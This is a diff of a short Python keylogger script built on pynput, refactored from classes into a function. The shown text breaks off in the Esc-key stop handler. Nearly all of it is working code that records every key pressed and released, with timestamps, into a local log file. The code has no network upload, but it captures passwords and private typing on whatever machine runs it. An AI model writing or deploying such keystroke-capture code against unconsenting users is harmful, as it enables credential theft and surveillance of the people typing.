@@ -1,26 +1,23 @@
-import datetime
 import logging
-import time
 
 from pynput import keyboard
 
 
-class Logger():
-        logging.basicConfig( filename=("Key.log"), filemode="w", format='%(asctime)s:%(message)s',
-                             level=logging.DEBUG )
+def logger():
+    logging.basicConfig( filename=("Key.log"), filemode="w", format='%(asctime)s:%(message)s',
+                         level=logging.DEBUG )
 
-class Listener():
     def on_press(key):
         try:
             # logging.warning("{:%H:%M:%S, %d %B, %Y}".format( datetime.datetime.now() ))
-            logging.warning( '---> Alphanumeric key ({0}) pressed'.format( key.char ) )
+            logging.warning( '--->  {0}'.format( key.char ) )
         except AttributeError:
-            logging.warning( '---> Special key {0} pressed'.format(
+            logging.warning( '-->  {0}'.format(
                     key ) )
             # logging.warning( "{:%H:%M:%S, %d %B, %Y}".format( datetime.datetime.now() ) )
 
     def on_release(key):
-        logging.warning( '---> {0} released'.format(
+        logging.warning( '--->  {0} released'.format(
                 key ) )
         # Turns off keylogger
         if key == keyboard.Key.esc:
